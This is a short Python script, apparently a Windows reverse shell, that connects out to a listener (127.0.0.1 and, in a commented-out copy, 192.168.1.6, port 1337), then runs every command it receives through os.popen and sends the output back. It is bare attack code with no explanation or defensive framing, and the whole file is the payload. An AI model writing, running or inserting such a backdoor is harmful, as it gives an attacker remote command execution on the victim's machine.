import socket,os

# reverse shell for windows

host = "127.0.0.1"
port = 1337

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))

while 1:
    command = sock.recv(1024)
    for line in os.popen(command):
        sock.send(line)



##################################### windows reverse shell ############
#import socket, os
#
#host = "192.168.1.6"
#port = 1337
#
#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#sock.connect((host,port))
#
#while 1:
#    command = sock.recv(1024)
#    sock.send(os.popen(command).read())

